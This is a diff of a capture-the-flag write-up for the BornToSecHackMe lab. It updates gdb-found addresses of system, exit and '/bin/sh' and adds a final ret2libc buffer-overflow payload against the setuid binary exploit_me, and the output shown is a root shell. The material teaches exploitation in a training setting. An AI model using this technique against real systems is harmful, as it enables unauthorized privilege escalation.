@@ -12,19 +12,7 @@ exploit_me: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SY
 
 We find an executable and get flashbacks to rainfall/override.
 
-[HexRays](https://dogbolt.org/) decompiles it to the following:
-```c
-int main(int argc, const char **argv)
-{
-	char dest[128];
-
-	if (argc <= 1)
-		return (1);
-	strcpy(dest, argv[1]);
-	puts(dest);
-	return (0);
-}
-```
+[HexRays](https://dogbolt.org/) decompiles it to a readable file: exploit_me.c.
 
 Let's execute it using gdb with a [buffer overflow pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) of size 200 to determine the offset of the eip.
 ```shell
@@ -42,12 +30,21 @@ Our trusted website tells us the offset is 140, which we would've already known 
 Ret2Libc:
 ```shell
 (gdb) p system
-$1 = {<text variable, no debug info>} 0xf7cf6150 <system>
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 (gdb) p exit
-$2 = {<text variable, no debug info>} 0xf7ce8440 <exit>
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
 (gdb) info proc map
 [...]
-(gdb) find 0xf7cae000, 0xf7ed9000, "/bin/sh"
-0xf7e6b0f5
+(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh"
+0xb7f8cc58
 1 pattern found.
+```
+
+### Putting everything together:
+
+```shell
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print 140 * "A" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA �����X���
+# whoami
+root
 ```
